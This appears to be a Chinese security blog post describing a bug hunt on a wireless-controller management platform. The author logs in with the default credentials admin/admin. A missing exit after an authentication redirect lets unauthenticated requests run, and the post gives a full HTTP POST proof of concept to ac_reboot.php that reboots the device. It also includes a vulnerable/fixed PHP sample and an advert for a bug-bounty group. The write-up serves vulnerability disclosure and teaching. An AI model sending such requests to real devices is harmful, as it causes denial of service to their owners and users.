#  cnvd通用型漏洞挖掘思路-从逻辑漏洞到拒绝服务漏洞   
 Z2O安全攻防   2024-12-26 12:26  
  
点击「蓝色」字体关注我们！  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9L0nuGUVpuV1Sz8ogA9E1drUmKUEQIHd194b10bibeCFVjPcd5IAZAhGDUkmibP2ebrP2Michdw5oNNJhWR2YcNMWq/640?wx_fmt=svg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9L0nuGUVpuV1Sz8ogA9E1drkc6caFLicR1qyVPXMq3fhgKEkJxbgBicdzZialrabiaVVcD40T64iaB1z8qodahNib7s3Q/640?wx_fmt=svg&from=appmsg "")  
  
  
  
用鹰图语法找了波网络设备的相关词汇  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVPAYAtzvkicy6WPTQNaezia8RQayxW0txudzltGYPbrwah1oKb7KKib5lQ/640?wx_fmt=png&from=appmsg "")  
  
然后找到了个智能无线管理平台  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVUfdAX6PwMT3Tm7zshuLHicY4iarndfe9vxcgxC7btPkFOeib4icaysnicoQ/640?wx_fmt=jpeg&from=appmsg "")  
  
通过祖传弱口令admin admin进入  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVIXMQttB13uAVv86NrMfFCqmeRpy5Q9aFDJGoGlUicyJxbjLwQCTkK6A/640?wx_fmt=jpeg&from=appmsg "")  
  
之后就是测试相应功能点,最终没有找到有SQL注入的参数和RCE的地方  
  
不过这里确定归属是来到系统管理  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVolATEr1ud7ONtsjUVL5GicibfsuX88ubLAa8Tx6boWnMkjgpowicWeydg/640?wx_fmt=jpeg&from=appmsg "")  
  
是这家公司开发的  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVNoLPLFia9QEsMdTQZgbaV8s1LjSv8SxJWrfH2xV2kGFHeGKoYx8GMaw/640?wx_fmt=jpeg&from=appmsg "")  
  
对证书再见吧,不够5000万  
  
在无限重复黑盒测试抓包测功能点的过程中,来到功能池  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVwsic6mKt5owpsVLNDl8v4VyavKFvRqgjkdIpfsjx29YkgzW1e8xia7NQ/640?wx_fmt=jpeg&from=appmsg "")  
  
随便调节一下,点击应用,Burp进行抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVd7zyEzJuP2qlEEOgncpbVSHOoRHIZaJtOSJsOubJ5wd64Ch1xeKzKw/640?wx_fmt=jpeg&from=appmsg "")  
  
该逻辑漏洞在于我删除Cookie后,如上图是有Cookie时应用后正常success表示应用成功  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVkF8HBBZ1AUQyp2fglebn5JLzzYmFjB5gC8KWXsJ9ribpPrib3corEdNg/640?wx_fmt=jpeg&from=appmsg "")  
  
删除Cookie后,发现正常执行相应功能并回显success(虽然代码鉴权到了,并跳转index.php用户认证处,但没有阻止代码继续往下跑)  
  
造成这个漏洞成因可以模拟出相应白盒代码:  
```
<?php
if (!isset($_COOKIE['PHPSESSID'])) {
    header("Location: index.php");
}

// 后续的代码继续执行
echo "Welcome to the success page!"; 
// 虽然跳转到index.php,但是echo也会继续执行
?>
```  
  
修复代码如下:  
```
<?php
if (!isset($_COOKIE['PHPSESSID'])) {
    header("Location: index.php");
    exit;  //增加exit修复继续执行
}

// 后续的代码继续执行
echo "Welcome to the success page!"; 
// 虽然跳转到index.php,但是echo也会继续执行
?>
```  
  
利用该逻辑漏洞,找到个设备重启功能和恢复出厂商功能,从而变成影响很大的前台拒绝服务漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVlplUPCTyBMiaS6atfxu5CkWZ9YGD6Qef4ONiaiaHzmmCxyhUD97vmibTHw/640?wx_fmt=jpeg&from=appmsg "")  
  
拒绝服务POC如下:  
```
POST /ac_reboot.php?action=submit HTTP/1.1
Host: ***********
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27648818302819120642279485210
Content-Length: 62
Origin: http://***************
Connection: close
Referer: http://***********:**/ac_reboot.php
Upgrade-Insecure-Requests: 1

-----------------------------27648818302819120642279485210--
```  
  
总结:  
  
挖漏洞要细心,并思考漏洞的成因  
  
  
建立了一个  
src专项圈子，内容包含**src漏洞知识库**、**src挖掘技巧**、**src视频教程**等，一起学习赚赏金技巧，以及专属微信群一起挖洞  
  
圈子专注于更新src相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、分享src优质视频课程
3、分享src挖掘技巧tips
4、小群一起挖洞
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg41LkR0ezBlmjJY4Lwgg8mr1A5efwqe0yGE9KTQwLPJTe9zyv3wgYnhA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOXg868PqXyjsACp9LhuEeyfB2kTZVOt5Pz48txg7ueRUvDdeefTNKdg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZDDDv3NsbJDuSicLzBbwVDCPFgbmiaJ4ibf4LRgafQDdYodOgakdpbU1H6XfFQCL81VTudGBv2WniaDA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZrY2H5J445ZKSwk8PKKN5I3DNFdtPMB7Z44ibQI2yMgiazCvjyib6YnRJPhzVg2KqfPM80VdcGT9RFA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图片  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4Bd1oBmTkA5xlNwZM5fLghYeibMBttWrf57h8sU7xDyTe5udCNicuHo8w/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYrUoo5XZpxN9Inq87ic71D6aUeMdaWrKXgYYia2On8nMA7bqWDySa8odAq1a0kkp3WFgf0Zp0Eut0A/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4KKlic4yiafWTpLdejicQe3MllEQc24ypeI3anaK7IjJDVyq1WVQN2yKBA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
图片  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOHgjJxnq1ibibJgVUx3LwCjZj62vygx8w6rxia1icmIWiax2YlP6S6LmlmlQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOApVm8H605qOibxia5DqPHfbWD6lmcweDjGv4DLl45waD068ugw2Iv2vg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图片  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOwldaSATYOh1WQpk1qz15rLxehOAn4aK7tdbSyNEuHDZpIISCtl6Q8w/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4jFsKRMMNDKbsAZhscCiagnyJScMVmFUqMtae5omlLRdu095mywWszjQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图片![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4uGJ2SA5BhZ3UyibZvVmcP3sozQEOfVr0jftWpC3YkpDiaAicS1ib3EgXHA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mia12sBTzp8qzt2BPnmicvsIDEzyo68NUVWsmpiarpVlibiciaibKMYEQ1Kne9bdOStSDAo90BA7cIgyQ6RhOUJso1V4g/640?wx_fmt=png&from=appmsg "分隔线")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/UsichrXlnR9L0nuGUVpuV1Sz8ogA9E1drp4zR93BC1TbCSs4pwMDGjdRbOmKxEPgmj6KFxBO5cUfiaspmibGv2kzf4KiamPUcgQq/640?wx_fmt=svg&from=appmsg "")  
  
点击【在看】你最好看~  
  
